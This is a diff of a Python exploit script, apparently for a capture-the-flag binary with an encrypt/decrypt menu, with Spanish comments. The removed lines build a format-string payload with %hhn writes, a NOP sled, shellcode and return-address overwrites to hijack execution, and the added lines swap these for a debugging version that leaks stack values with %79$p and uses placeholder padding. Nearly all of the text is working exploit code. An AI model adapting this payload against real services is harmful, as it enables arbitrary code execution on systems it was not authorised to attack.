@@ -77,7 +77,9 @@ def setkey():
 def encrypt(pt):
     sendline('2')
     recvuntil(' : ')
-    sendline(str(len(pt)))
+    len_pt = len(pt)
+    assert len_pt <= 1024
+    sendline(str(len_pt))
     recvuntil('data\n')
     sendline(pt)
     recvuntil('(hex encoded) -\n')
@@ -88,7 +90,9 @@ def encrypt(pt):
 def decrypt(ct):
     sendline('3')
     recvuntil(' : ')
-    sendline(str(len(ct)))
+    len_ct = len(ct)
+    assert len_ct <= 1024
+    sendline(str(len_ct))
     recvuntil('data\n')
     sendline(ct)
     recvuntil('result -\n')
@@ -116,23 +120,31 @@ def main():
 
     # en ret_addr sobreescribo 0x40140a por 0x602560
     payload  = ''
-    payload += '%37x'
-    payload += '%_$hhn' # byte del medio
-    payload += '%59x'
-    payload += '%_$hhn' # MSF
-    payload += '%_x'
-    payload += '%_$hhn' # LSB
-    payload += ' ' * (len(payload) % 8)
+    #payload += '%37x' # 0x25
+    payload += '%79$p' # byte del medio
+    #payload += '%59x' # 0x60
+    #payload += '%87$p' # MSF
+    #payload += '%50x'  # 50 porque si
+    #payload += '%85$p' # LSB
+    pad = len(payload) % 8
+    if pad > 0:
+        payload += ' ' * (8 - pad)
 
-    payload += '\x90' * (8 * 8 + 7)
-    payload += shellcode
+    payload += 'A' * 8
+    #payload += p64(ret_addr + 0) # LSB
+    payload += 'B' * 8
+    #payload += p64(ret_addr + 1)
+    payload += 'C' * 8
+    #payload += p64(ret_addr + 2) # MSB
 
-    payload += p64(ret_addr + 0) # LSB
-    payload += p64(ret_addr + 1)
-    payload += p64(ret_addr + 2) # MSB
+    #payload += shellcode
+    payload += 'Z' * len(shellcode)
+    pad = len(payload) % 8
+    if pad > 0:
+        payload += ' ' * (8 - pad)
 
-    run(payload)
-    interactive()
+    print run(payload)
+    #interactive()
 
 if __name__ == '__main__':
     try:
